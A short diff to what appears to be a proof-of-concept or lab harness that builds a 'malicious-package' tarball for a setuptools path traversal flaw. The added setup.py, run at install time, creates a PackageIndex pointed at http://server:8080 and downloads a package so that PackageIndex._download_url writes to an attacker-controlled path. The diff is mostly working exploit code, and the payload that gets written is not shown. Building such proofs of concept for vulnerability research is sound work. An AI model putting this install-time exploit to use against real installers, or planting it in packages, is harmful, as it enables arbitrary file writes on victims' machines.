@@ -81,14 +81,29 @@ def build_malicious_package():
     os.makedirs(PACKAGE_DIR, exist_ok=True)
     tarball = os.path.join(PACKAGE_DIR, "malicious-package-1.0.tar.gz")
 
+    # This setup.py directly uses PackageIndex which has the vulnerability
     setup_py = '''
+import tempfile
 from setuptools import setup
+from setuptools.package_index import PackageIndex
+
+# Trigger the path traversal vulnerability during setup
+# PackageIndex._download_url() writes to attacker-controlled path
+index_url = "http://server:8080/simple/"
+pi = PackageIndex(index_url=index_url)
+
+# Scan and download triggers the vulnerability
+try:
+    pi.scan_url("http://server:8080/deps/")
+    with tempfile.TemporaryDirectory() as tmpdir:
+        pi.download("triggerpkg", tmpdir)
+except Exception as e:
+    print(f"[*] Download phase complete: {e}")
+
 setup(
     name="malicious-package",
     version="1.0",
     py_modules=["malicious"],
-    setup_requires=["triggerpkg"],
-    dependency_links=["http://server:8080/deps/"],
 )
 '''
 
